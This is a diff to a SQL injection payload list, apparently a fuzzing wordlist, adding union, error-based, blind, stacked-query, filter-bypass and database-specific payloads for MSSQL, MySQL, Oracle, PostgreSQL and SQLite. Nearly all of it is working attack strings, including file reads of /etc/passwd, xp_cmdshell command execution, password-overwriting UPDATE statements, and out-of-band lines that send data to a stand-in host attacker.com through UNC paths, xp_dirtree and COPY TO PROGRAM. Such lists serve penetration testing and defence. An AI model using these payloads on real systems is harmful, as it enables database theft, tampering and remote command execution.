@@ -39,31 +39,59 @@
 ' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
 ' UNION SELECT 1,load_file('/etc/passwd'),3--
 ' UNION SELECT 1,2,3,4,5--
+' UNION SELECT 1,2,3,4,5,6--
+' UNION SELECT 1,2,3,4,5,6,7--
 
 # ========================
 # ERROR-BASED SQLi
 # ========================
-' AND GTID_SUBSET(@@version,0)-- 
-' AND extractvalue(1,concat(0x3a,@@version))-- 
-' OR updatexml(1,concat(0x3a,(SELECT @@version)),1)-- 
-' OR (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x.a)--
+' AND GTID_SUBSET(@@version,0)--
+' AND extractvalue(1,concat(0x3a,@@version))--
+' OR updatexml(1,concat(0x3a,(SELECT @@version)),1)--
+' OR (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),concat(floor(rand(0)*2),(SELECT version()))a FROM information_schema.tables GROUP BY a)b)--
+' AND ROW(1,1)>(SELECT COUNT(*),concat(CHAR(95),CHAR(33),CHAR(64),(SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--
 
 # ========================
 # TIME-BASED BLIND SQLi
 # ========================
-' OR IF(1=1,SLEEP(5),0)-- 
-' OR (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
-' OR BENCHMARK(10000000,MD5('test'))-- 
-' OR 1=1 WAITFOR DELAY '0:0:5'-- 
+' OR IF(1=1,SLEEP(5),0)--
+' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' OR BENCHMARK(10000000,MD5('test'))--
+' OR 1=1 WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+' AND SLEEP(5)--
+' AND 1=1 AND SLEEP(5)--
+
+# ========================
+# BOOLEAN-BASED BLIND SQLi
+# ========================
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+1' AND 1=1 AND '1'='1
+1' AND 1=2 AND '1'='1
+' OR 'a'='a'--
+' OR 'a'='b'--
+
+# ========================
+# STACKED QUERIES
+# ========================
+'; SELECT 1--
+'; SELECT SLEEP(5)--
+'; INSERT INTO users VALUES(1,'hacked','hacked')--
+'; UPDATE users SET password='hacked'--
 
 # ========================
 # OUT-OF-BAND (OOB) EXFILTRATION
 # ========================
-' OR (SELECT LOAD_FILE(concat('\\\\',(SELECT @@version),'.attacker.com\\share\\'))-- 
-' OR (SELECT 1 INTO OUTFILE '/var/www/html/loot.txt')-- 
+' OR (SELECT LOAD_FILE(concat('\\\\',(SELECT @@version),'.attacker.com\\share\\')))--
+' OR (SELECT 1 INTO OUTFILE '/var/www/html/loot.txt')--
 
 # ========================
-# WAF/FILTER BYPASS
+# WAF / FILTER BYPASS
 # ========================
 '/**/OR/**/'1'='1
 '/*!50000OR*/1=1--
@@ -74,65 +102,56 @@
 ' BETWEEN 0 AND 1--
 ' DIV 1--
 ' IS NOT NULL--
+'%20OR%20'1'='1
+'%09OR%09'1'='1
+'%0aOR%0a'1'='1
+'+OR+'1'='1
+'%2bOR%2b'1'='1
+'/*!OR*/'1'='1
+' OR 1-- -
+' OR 1#
 
 # ========================
 # MSSQL-SPECIFIC
 # ========================
-'; EXEC xp_cmdshell('whoami')-- 
-'; EXEC master..xp_cmdshell 'net user'-- 
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC master..xp_cmdshell 'net user'--
 ' OR '1'='1'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
+'; EXEC xp_dirtree '\\attacker.com\share'--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns))--
 
 # ========================
 # MYSQL-SPECIFIC
 # ========================
-' INTO OUTFILE '/tmp/test.txt'-- 
-' INTO DUMPFILE '/etc/passwd'-- 
-' OR BINARY 'a'='A'-- 
+' INTO OUTFILE '/tmp/test.txt'--
+' INTO DUMPFILE '/etc/passwd'--
+' OR BINARY 'a'='A'--
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+' AND LENGTH((SELECT database()))>0--
+' AND MID(version(),1,1)='5'--
 
 # ========================
 # ORACLE-SPECIFIC
 # ========================
-' OR (SELECT utl_inaddr.get_host_name((SELECT user FROM dual)) FROM dual)-- 
-' AND (SELECT CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual)) FROM dual)=1-- 
+' OR (SELECT utl_inaddr.get_host_name((SELECT user FROM dual)) FROM dual)--
+' AND (SELECT CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual)) FROM dual)=1--
+' UNION SELECT NULL FROM dual--
+' UNION SELECT NULL,NULL FROM dual--
+' AND 1=1 FROM dual--
 
 # ========================
-# NOSQL INJECTION (MongoDB)
+# POSTGRESQL-SPECIFIC
 # ========================
-' || 1==1//
-'; return true
-' || 'a'=='a
-{"$where": "1 == 1"}
-{"$gt": ""}
-'; sleep(5000)//
+' AND 1=CAST((SELECT version()) AS int)--
+'; SELECT pg_sleep(5)--
+' UNION SELECT NULL,version(),NULL--
+' AND (SELECT pg_sleep(5))--
+'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--
 
 # ========================
-# JSON-BASED SQLi
+# SQLITE-SPECIFIC
 # ========================
-{"username":"admin'--","password":"x"}
-{"username":"admin' OR 1=1--","password":"x"}
-{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
-{"username":"admin' UNION SELECT 1,2,3--","password":"x"}
-
-# ========================
-# SECOND-ORDER ATTACKS
-# ========================
-admin'--
-admin'/*
-admin'#
-admin' OR 1=1--
-admin' UNION SELECT 1,load_file('/etc/passwd'),3--
-admin';(SELECT * FROM users)--
-
-# ========================
-# DOM-BASED SQLi
-# ========================
-<script>alert(1);</script>
-<img src=x onerror="alert(1)">
-';alert(1)//
-
-# ========================
-# LDAP INJECTION
-# ========================
-*)(uid=*))(|(uid=*
-*))%00
-admin)(&)
+' UNION SELECT sqlite_version()--
+' AND 1=CAST(sqlite_version() AS int)--
+' UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'--
